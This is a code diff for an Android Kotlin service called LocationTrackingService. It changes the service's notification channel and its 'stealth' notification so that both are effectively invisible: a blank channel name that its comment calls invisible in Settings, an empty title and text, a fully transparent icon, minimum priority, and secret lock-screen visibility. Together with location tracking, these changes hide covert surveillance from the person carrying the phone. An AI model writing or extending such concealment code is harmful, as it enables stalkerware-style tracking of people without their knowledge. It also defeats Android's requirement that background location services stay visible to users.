@@ -235,8 +235,8 @@ class LocationTrackingService : Service() {
     private fun createNotificationChannel() {
         val channel = NotificationChannel(
             CHANNEL_ID,
-            "System Services",
-            NotificationManager.IMPORTANCE_MIN          // lowest — no status-bar icon
+            " ",                                        // blank name — invisible in Settings
+            NotificationManager.IMPORTANCE_MIN          // lowest — no status-bar icon ever
         ).apply {
             description = ""
             setShowBadge(false)
@@ -250,9 +250,9 @@ class LocationTrackingService : Service() {
 
     private fun buildStealthNotification(): Notification {
         return NotificationCompat.Builder(this, CHANNEL_ID)
-            .setContentTitle("System Service")
-            .setContentText("")
-            .setSmallIcon(android.R.drawable.stat_notify_sync_noanim)
+            .setContentTitle("")                        // no title
+            .setContentText("")                         // no text
+            .setSmallIcon(R.drawable.ic_transparent)   // fully transparent icon
             .setPriority(NotificationCompat.PRIORITY_MIN)
             .setVisibility(NotificationCompat.VISIBILITY_SECRET)   // hidden on lock screen
             .setOngoing(true)
